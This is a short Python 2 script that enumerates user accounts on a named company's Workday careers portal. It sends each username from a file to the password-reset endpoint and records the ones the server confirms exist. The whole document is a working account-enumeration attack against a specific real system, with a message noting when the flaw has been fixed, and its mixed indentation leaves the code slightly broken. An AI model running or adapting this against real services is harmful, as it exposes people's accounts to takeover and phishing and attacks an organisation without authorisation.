#!/bin/python

# Author: Wyatt Dahlenburg

import sys
import requests

if (len(sys.argv) < 3):
	print "Please list an input and output file"
	print "Ex: python cap_one_user_enum.py input_list.txt output_file.txt"
	sys.exit(1)

with open(sys.argv[1]) as input_list:
    for line in input_list:
        user = line.rstrip()
	response = requests.post("https://capitalone.wd1.myworkdayjobs.com/en-US/Capital_One/initiatereset", data={'username': user})
	if (response.status_code != 200):
		print "Network error"
	else:
		#Check for success or failure
		if "Failed" in response.text:
			print "Failure: " + user + " is not in the database"
		elif "reset" in response.text:
			print "Success: " + user
			# Add to output file
			with open(sys.argv[2], "a") as output:
    				output.write(user + "\n")
		else:
			print "Workday fixed the bug!"


